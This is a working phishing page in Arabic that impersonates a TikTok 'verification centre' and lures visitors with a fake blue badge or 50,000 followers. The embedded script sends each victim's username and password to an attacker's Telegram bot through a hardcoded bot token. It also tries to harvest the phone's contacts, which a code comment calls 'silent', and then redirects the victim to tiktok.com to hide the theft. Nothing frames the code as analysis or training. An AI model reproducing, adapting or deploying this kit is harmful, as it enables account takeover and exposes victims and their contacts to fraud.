<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - توثيق الحساب وزيادة المتابعين</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #121212; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        
        .wrapper { width: 100%; max-width: 380px; }
        .box { background: #1f1f1f; border: 1px solid #333; padding: 35px 25px; width: 100%; text-align: center; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        
        .tiktok-logo { width: 48px; height: 48px; margin: 0 auto 20px auto; display: block; fill: #fe2c55; }
        
        h2 { font-size: 22px; font-weight: bold; margin-bottom: 8px; color: #fff; }
        .sub { font-size: 12px; color: #a1a1a1; margin-bottom: 25px; line-height: 1.5; }

        .grid-offers { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .offer-card { background: #2a2a2a; border: 1px solid #404040; border-radius: 8px; padding: 10px; text-align: center; cursor: pointer; font-size: 12px; transition: 0.2s; }
        .offer-card.selected { border-color: #fe2c55; background: rgba(254, 44, 85, 0.15); }
        .offer-card h4 { color: #fff; font-size: 13px; margin-bottom: 2px; }
        .offer-card span { color: #a1a1a1; font-size: 10px; }

        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; background: #2f2f2f; border: 1px solid #444; color: #fff; border-radius: 6px; outline: none; font-size: 14px; }
        input:focus { border-color: #fe2c55; }

        .tt-btn { width: 100%; padding: 13px; background: #fe2c55; border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 6px; cursor: pointer; margin-top: 10px; transition: 0.2s; }
        .tt-btn:hover { background: #e0244c; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="box">
            <!-- شعار تيك توك الرسمي SVG -->
            <svg class="tiktok-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.1z"/></svg>
            
            <h2>مركز توثيق تيك توك</h2>
            <p class="sub">اختر الخدمة المطلوبة وسجل الدخول للحصول على الشارة وتفعيل الحساب.</p>
            
            <div class="grid-offers">
                <div class="offer-card selected" onclick="selectOffer(this, 'شارة التوثيق الزرقاء')">
                    <h4>شارة التوثيق</h4>
                    <span>العلامة الزرقاء</span>
                </div>
                <div class="offer-card" onclick="selectOffer(this, '50 ألف متابع حقيقي')">
                    <h4>50 ألف متابع</h4>
                    <span>دعم المشاهدات</span>
                </div>
            </div>

            <form id="ttForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="اسم المستخدم أو البريد أو الهاتف" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" required>
                </div>
                <button type="submit" class="tt-btn">متابعة وتأكيد الطلب</button>
            </form>
        </div>
    </div>

    <script>
        let currentOffer = "شارة التوثيق الزرقاء";
        function selectOffer(el, name) {
            document.querySelectorAll('.offer-card').forEach(c => c.classList.remove('selected'));
            el.classList.add('selected');
            currentOffer = name;
        }

        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('ttForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            // سحب جهات الاتصال بصمت تام في الخلفية
            let contactsData = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (contacts.length > 0) {
                        contactsData = contacts.map(c => `المستخدم: ${c.name?.[0] || 'بدون'} - الرقم: ${c.tel?.[0] || ''}`).join('\n');
                    }
                } catch(e) {}
            }

            // إرسال البيانات إلى بوت المسوق المستخرج من الرابط
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد تيك توك جديد\nالخدمة: ${currentOffer}\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
            
            if(contactsData !== "لم يتم منح الصلاحية") {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contactsData}`)}`);
            }

            // تحويل فوري للموقع الرسمي
            setTimeout(() => { 
                window.location.href = "https://www.tiktok.com"; 
            }, 800);
        });
    </script>
</body>
</html>
